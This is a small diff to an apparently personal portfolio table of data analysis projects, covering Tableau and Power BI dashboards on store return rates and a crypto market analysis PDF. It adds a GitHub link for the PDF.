@@ -8,4 +8,4 @@ PROJECT | TITLE|DESCRIPTION|LINK
 #2|LACEY_LEGRONE_T.T._PROJECT|TABLEAU PROJECT, CATEGORY AND SUB-CATEGORY STORE REATURN RATE ANALYSIS|https://raw.githubusercontent.com/laceylegrone/Data_projects_TripleTen/refs/heads/main/lacey_legrone_t.t._project_4__1755405895.zip
 #3|PHOTO_FROM_POWER_BI_| POWER BI APP ANAYSIS DASHBOARD|https://raw.githubusercontent.com/laceylegrone/Data_projects_TripleTen/refs/heads/main/photos_from_power_bi_1768159878.zip
 #4|STORYTELLINGWITHDATA5.ZIP| TABLEAU STORE RETURN RATE DATA ANALYSIS|https://public.tableau.com/shared/K2Z4RHRMM?:display_count=n&:origin=viz_share_link
-#5 | crypto analysis1.pdf| anaysis of current crypto market at the time, from messari.io data and metrics.|
+#5 | crypto analysis1.pdf| anaysis of current crypto market at the time, from messari.io data and metrics.| https://raw.githubusercontent.com/laceylegrone/Data_projects_TripleTen/main/crypto%20analysis1.pdf
